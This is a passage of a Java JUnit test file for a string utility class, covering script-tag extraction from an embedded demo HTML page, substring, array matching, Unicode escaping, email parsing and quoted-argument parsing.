		"<div id = \"tabFolder\" name = \"tabFolder\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Tab\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//tabDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//tabDoc\" target = \"mainFrame\">Tab</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"progressBarFolder_line\" name = \"progressBarFolder_line\" src = \"/csiebug-taglib-demo//images/Eplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('progressBarFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"progressBarFolder_folder\" name = \"progressBarFolder_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Progress Bar\" style = \"CURSOR:pointer\" onClick = \"showSubTree('progressBarFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Progress Bar\" style = \"CURSOR:pointer\" onClick = \"showSubTree('progressBarFolder', '/csiebug-taglib-demo//images')\">Progress&nbsp;Bar</span>" + 
		"" + 
		"<div id = \"progressBarFolder\" name = \"progressBarFolder\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Progress Bar\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//progressBarDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//progressBarDoc\" target = \"mainFrame\">Progress&nbsp;Bar</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"chart_line\" name = \"chart_line\" src = \"/csiebug-taglib-demo//images/Eplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('chart', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"chart_folder\" name = \"chart_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Chart\" style = \"CURSOR:pointer\" onClick = \"showSubTree('chart', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Chart\" style = \"CURSOR:pointer\" onClick = \"showSubTree('chart', '/csiebug-taglib-demo//images')\">Chart</span>" + 
		"" + 
		"<div id = \"chart\" name = \"chart\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Vertline.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"XML-SWF Chart\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//xmlSwfChartDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//xmlSwfChartDoc\" target = \"mainFrame\">XML-SWF&nbsp;Chart</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img id = \"codeFolder_line\" name = \"codeFolder_line\" src = \"/csiebug-taglib-demo//images/Lplus.gif\" style = \"CURSOR:pointer\" onClick = \"showSubTree('codeFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img id = \"codeFolder_folder\" name = \"codeFolder_folder\" src = \"/csiebug-taglib-demo//images/Cfolder.gif\" title = \"Code\" style = \"CURSOR:pointer\" onClick = \"showSubTree('codeFolder', '/csiebug-taglib-demo//images')\" align = \"absmiddle\">" + 
		"<span title = \"Code\" style = \"CURSOR:pointer\" onClick = \"showSubTree('codeFolder', '/csiebug-taglib-demo//images')\">Code</span>" + 
		"" + 
		"<div id = \"codeFolder\" name = \"codeFolder\" style = \"display:none;line-height:0\">" + 
		"<img src = \"/csiebug-taglib-demo//images/Blank.gif\" align = \"absmiddle\"></img>" + 
		"<span style = \"line-height:normal; white-space:nowrap\">" + 
		"<img src = \"/csiebug-taglib-demo//images/L.gif\" align = \"absmiddle\"></img>" + 
		"" + 
		"<img src = \"/csiebug-taglib-demo//images/Leaf.gif\" title = \"Code\" style = \"CURSOR:pointer\" align = \"absmiddle\" onClick = \"parent.mainFrame.location.href='/csiebug-taglib-demo//codeDoc'\">" + 
		"<a href = \"/csiebug-taglib-demo//codeDoc\" target = \"mainFrame\">Code</a>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"</span>" + 
		"<br>" + 
		"" + 
		"</div>" + 
		"" + 
		"" + 
		"" + 
		"			" + 
		"			<!-- ??????? -->" + 
		"			" + 
		"			<!-- Javascript? -->" + 
		"			<script src = \"/csiebug-taglib-demo//js/AC_RunActiveContent.js\"></script>" + 
		"" + 
		"<script src = \"/csiebug-taglib-demo//js/csiebug.js\"></script>" + 
		"" + 
		"<script src = \"/csiebug-taglib-demo//js/jquery-1.3.2.js\"></script>" + 
		"" + 
		"<script src = \"/csiebug-taglib-demo//js/jquery-ui-1.7.2.custom.min.js\"></script>" + 
		"" + 
		"<script src = \"/csiebug-taglib-demo//js/XMLPortletRequest.js\"></script>" + 
		"" + 
		"			" + 
		"			<script src=\"/csiebug-taglib-demo//taglibDemoList.js\"></script>" + 
		"			" + 
		"			<script type=\"text/javascript\">" + 
		"				$(document).ready(function() {" + 
		"					" + 
		"					" + 
		"				});" + 
		"			</script>" + 
		"			<!-- Javascript??? -->" + 
		"" + 
		"			" + 
		"		</form>" + 
		"	</body>" + 
		"</html>";

		
		List<String> list = StringUtility.getElementsByTagName(content, "script");
		
		assertEquals(8, list.size());
		
		List<String> expectedList = new ArrayList<String>();
		expectedList.add("<script language = \"javascript\" src = \"/csiebug-taglib-demo//js/treeview.js\"></script>");
		expectedList.add("<script src = \"/csiebug-taglib-demo//js/AC_RunActiveContent.js\"></script>");
		expectedList.add("<script src = \"/csiebug-taglib-demo//js/csiebug.js\"></script>");
		expectedList.add("<script src = \"/csiebug-taglib-demo//js/jquery-1.3.2.js\"></script>");
		expectedList.add("<script src = \"/csiebug-taglib-demo//js/jquery-ui-1.7.2.custom.min.js\"></script>");
		expectedList.add("<script src = \"/csiebug-taglib-demo//js/XMLPortletRequest.js\"></script>");
		expectedList.add("<script src=\"/csiebug-taglib-demo//taglibDemoList.js\"></script>");
		expectedList.add("<script type=\"text/javascript\">				$(document).ready(function() {														});			</script>");
		
		for(int i = 0; i < list.size(); i++) {
			assertEquals(expectedList.get(i), list.get(i));
		}
	}
	
	@Test
	public void testSubstring() {
		String value = "1234567890";
		String compare = "12345";
		
		assertEquals(compare, StringUtility.substring(value, 5));
		assertEquals(value, StringUtility.substring(value, 10));
		assertEquals(value, StringUtility.substring(value, 15));
	}
	
	@Test
	public void testIsInArray() {
		String[] array = new String[]{"value1", "value2", "value3"};
		
		assertEquals(true, StringUtility.isInArray("value1", array));
		assertEquals(true, StringUtility.isInArray("value2", array));
		assertEquals(true, StringUtility.isInArray("value3", array));
		assertEquals(false, StringUtility.isInArray("value4", array));
	}
	
	@Test
	public void testIsStartsWithInArray() {
		String[] array = new String[]{"value1", "value2", "value3"};
		
		assertEquals(true, StringUtility.isStartsWithInArray("value123", array));
		assertEquals(true, StringUtility.isStartsWithInArray("value223", array));
		assertEquals(true, StringUtility.isStartsWithInArray("value323", array));
		assertEquals(false, StringUtility.isStartsWithInArray("value423", array));
	}
	
	@Test
	public void testIsEndsWithInArray() {
		String[] array = new String[]{"value1", "value2", "value3"};
		
		assertEquals(true, StringUtility.isEndsWithInArray("123value1", array));
		assertEquals(true, StringUtility.isEndsWithInArray("123value2", array));
		assertEquals(true, StringUtility.isEndsWithInArray("123value3", array));
		assertEquals(false, StringUtility.isEndsWithInArray("123value4", array));
	}
	
	@Test
	public void testNative2Ascii() {
		String value = "測試文字";
		assertEquals("\\u6e2c\\u8a66\\u6587\\u5b57", StringUtility.native2ascii(value));
	}
	
	@Test
	public void testParseEmail() throws EmailFormatException {
		String email = "test@test.com";
		String[] emailPart = new String[]{"test", "test.com"};
		
		assertEquals(emailPart[0], StringUtility.parseEmail(email)[0]);
		assertEquals(emailPart[1], StringUtility.parseEmail(email)[1]);
		
		email = "test";
		try {
			StringUtility.parseEmail(email);
			assertEquals(true, false);
		} catch(EmailFormatException efex) {
			assertEquals(true, true);
		}
		
		email = "test@test@test.com";
		try {
			StringUtility.parseEmail(email);
			assertEquals(true, false);
		} catch(EmailFormatException efex) {
			assertEquals(true, true);
		}
	}
	
	@Test
	public void testParseParameters() throws StringParseException {
		String command = "test";
		String parameters = "param1 param2 param3 param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" param2 param3 param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2\" param3 param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		
		parameters = "param1 param2 \"param3\" param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 param2 param3 \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2\" param3 param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" param2 \"param3\" param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" param2 param3 \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2\" \"param3\" param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2\" param3 \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 param2 \"param3\" \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2\" \"param3\" param4";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2\" param3 \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" param2 \"param3\" \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2\" \"param3\" \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2\" \"param3\" \"param4\"";
		assert1(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2\" param3 param4";
		assert2(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2\" \"param3\" param4";
		assert2(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2\" param3 \"param4\"";
		assert2(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2\" \"param3\" \"param4\"";
		assert2(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2\" \"param3 param4\"";
		assertEquals(2, StringUtility.parseParameters(command + " " + parameters, command).size());
		assertEquals("param1 param2", StringUtility.parseParameters(command + " " + parameters, command).get(0));
		assertEquals("param3 param4", StringUtility.parseParameters(command + " " + parameters, command).get(1));
		
		parameters = "param1 \"param2 param3\" param4";
		assert3(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2 param3\" param4";
		assert3(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2 param3\" \"param4\"";
		assert3(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2 param3\" \"param4\"";
		assert3(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 param2 \"param3 param4\"";
		assert4(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" param2 \"param3 param4\"";
		assert4(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2\" \"param3 param4\"";
		assert4(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2\" \"param3 param4\"";
		assert4(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2 param3\" param4";
		assert5(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2 param3\" \"param4\"";
		assert5(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "param1 \"param2 param3 param4\"";
		assert6(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1\" \"param2 param3 param4\"";
		assert6(StringUtility.parseParameters(command + " " + parameters, command));
		
		parameters = "\"param1 param2 param3 param4\"";
		assert7(StringUtility.parseParameters(command + " " + parameters, command));
	}
	
	private void assert1(List<String> list) {
		assertEquals(4, list.size());
		
		for(int i = 0; i < list.size(); i++) {
			assertEquals("param" + (i + 1), list.get(i));
		}
	}
	
	private void assert2(List<String> list) {
		assertEquals(3, list.size());
		
		assertEquals("param1 param2", list.get(0));
		assertEquals("param3", list.get(1));
		assertEquals("param4", list.get(2));
	}
	
	private void assert3(List<String> list) {
		assertEquals(3, list.size());
		
		assertEquals("param1", list.get(0));
		assertEquals("param2 param3", list.get(1));
		assertEquals("param4", list.get(2));
	}
	
	private void assert4(List<String> list) {
		assertEquals(3, list.size());
		
		assertEquals("param1", list.get(0));
		assertEquals("param2", list.get(1));
		assertEquals("param3 param4", list.get(2));
	}
	
	private void assert5(List<String> list) {
		assertEquals(2, list.size());
		
		assertEquals("param1 param2 param3", list.get(0));
		assertEquals("param4", list.get(1));
	}
	
	private void assert6(List<String> list) {
		assertEquals(2, list.size());
		
		assertEquals("param1", list.get(0));
		assertEquals("param2 param3 param4", list.get(1));
	}
	
	private void assert7(List<String> list) {
		assertEquals(1, list.size());
		
		assertEquals("param1 param2 param3 param4", list.get(0));
	}
}
